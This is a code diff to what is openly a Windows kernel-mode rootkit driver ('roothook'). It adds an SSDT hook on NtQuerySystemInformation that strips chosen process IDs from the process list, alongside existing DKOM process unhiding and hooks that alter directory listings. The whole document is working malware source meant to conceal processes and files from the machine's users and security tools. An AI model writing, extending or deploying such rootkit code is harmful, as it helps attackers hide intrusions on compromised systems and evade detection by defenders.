@@ -4,6 +4,7 @@
 #pragma warning(disable : 4996)
 #pragma warning(disable : 4302)
 #pragma warning(disable : 4311)
+#pragma warning(disable : 4127)
 
 
 NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag) {
@@ -102,12 +103,21 @@ NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleN
 
 BOOL roothook::CleanAllHooks() {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+
+	// Unhook all hooked system services:
 	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERY_TAG))) {
 		return FALSE;
 	}
 	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG))) {
 		return FALSE;
 	}
+	if (!IS_DKOM && !NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_SYSCALL1809))) {
+		return FALSE;
+	}
+
+
+	// Unhide all processes by removing index 0:
 	Status = process::DKUnhideProcess(0, 0);
 	while (NT_SUCCESS(Status)) {
 		Status = process::DKUnhideProcess(0, 0);
@@ -217,7 +227,9 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag){
 	// Get the original function matching buffer and find the syscall number:
 	switch (Tag) {
 	case NTQUERY_TAG: OriginalFunction = &ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
-	case NTQUERYEX_TAG: OriginalFunction = &ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
+	case NTQUERYEX_TAG: OriginalFunction = &ActualNtQueryDirFileEx; SyscallNumber = NTQUERYEX_SYSCALL1809; break;
+	case NTQUERYSYSINFO_TAG: OriginalFunction = &ActualNtQuerySystemInformation; SyscallNumber = NTQUERYSYSINFO_SYSCALL1809; break;
+
 	default:
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
 		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid tag: %lu)\n", Tag);
@@ -329,6 +341,8 @@ NTSTATUS roothook::SSDT::SystemServiceDTUnhook(ULONG Tag) {
 	switch (Tag) {
 	case NTQUERY_TAG: ActualFunction = ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
 	case NTQUERYEX_TAG: ActualFunction = ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
+	case NTQUERYSYSINFO_TAG: ActualFunction = &ActualNtQuerySystemInformation; SyscallNumber = NTQUERYSYSINFO_SYSCALL1809; break;
+
 	default:
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
 		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid tag: %lu)\n", Tag);
@@ -482,7 +496,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 	case RKOP_HIDEPROC:
 		// Hide process with DKOM:
 
-		DbgPrintEx(0, 0, "Request Type: hide process via DKOM\n");
+		DbgPrintEx(0, 0, "Request Type: hide process via DKOM (1) / NtQuerySystemInformation hook (0) -> %d\n", IS_DKOM);
 		Return = HideProcessRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
 		return Return;
@@ -522,9 +536,6 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
 		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
 	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
-		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: actual NtQueryDirectoryFile failed with 0x%x\n", Status);
-		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
 		return Status;
 	}
 
@@ -591,9 +602,6 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
 		Length, FileInformationClass, QueryFlags, FileName);
 	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
-		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx: actual NtQueryDirectoryFileEx failed with 0x%x\n", Status);
-		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
 		return Status;
 	}
 
@@ -624,4 +632,58 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 		return STATUS_SUCCESS;  // type of information that is not traced, return success (nothing to change)
 	}
 	return Status;
+}
+
+
+NTSTATUS EvilQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+	OUT PVOID SystemInformation,
+	IN ULONG SystemInformationLength,
+	OUT PULONG ReturnLength OPTIONAL) {
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	QuerySystemInformation OgNtQuerySystemInformation = NULL;
+	PSYSTEM_PROCESS_INFORMATION CurrentProcess = NULL;
+	PSYSTEM_PROCESS_INFORMATION PreviousProcess = NULL;
+	PSYSTEM_PROCESS_INFORMATION PreviousCurrentProcess = NULL;
+	ULONG ProcessCount = 0;
+	
+
+	// Call the original NtQueryInformationFile:
+	OgNtQuerySystemInformation = (QuerySystemInformation)ActualNtQuerySystemInformation;
+	Status = OgNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+	if (!NT_SUCCESS(Status) || SystemInformation == NULL || SystemInformationClass != SystemProcessInformation) {
+		return Status;
+	}
+
+
+	// Patch processes list so it wont include my hidden processes:
+	CurrentProcess = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
+	PreviousProcess = CurrentProcess;
+	while ((ULONG64)CurrentProcess != (ULONG64)PreviousCurrentProcess || ProcessCount == 0) {
+		if (process::SIIsInHiddenProcesses((ULONG64)CurrentProcess->UniqueProcessId)) {
+			if (CurrentProcess->NextEntryOffset == 0) {
+				if (ProcessCount == 0) {
+					DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
+					DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQuerySystemInformation (Processes, Single): Found process %llu, hiding via request\n", (ULONG64)CurrentProcess->UniqueProcessId);
+					DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
+					SystemInformation = NULL;
+					return STATUS_NOT_FOUND;
+				}
+				// Last process in the linked list:
+				PreviousProcess->NextEntryOffset = 0;
+			}
+			else {
+				PreviousProcess->NextEntryOffset = PreviousProcess->NextEntryOffset + CurrentProcess->NextEntryOffset;
+			}
+			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
+			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQuerySystemInformation (Processes): Found process %llu, hiding via request\n", (ULONG64)CurrentProcess->UniqueProcessId);
+			DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
+		}
+		else {
+			PreviousProcess = CurrentProcess;  // If CurrentProcess was hidden previous needs to stay in place
+		}
+		PreviousCurrentProcess = CurrentProcess;
+		CurrentProcess = (PSYSTEM_PROCESS_INFORMATION)((ULONG64)CurrentProcess + CurrentProcess->NextEntryOffset);
+		ProcessCount++;
+	}
+	return STATUS_SUCCESS;
 }
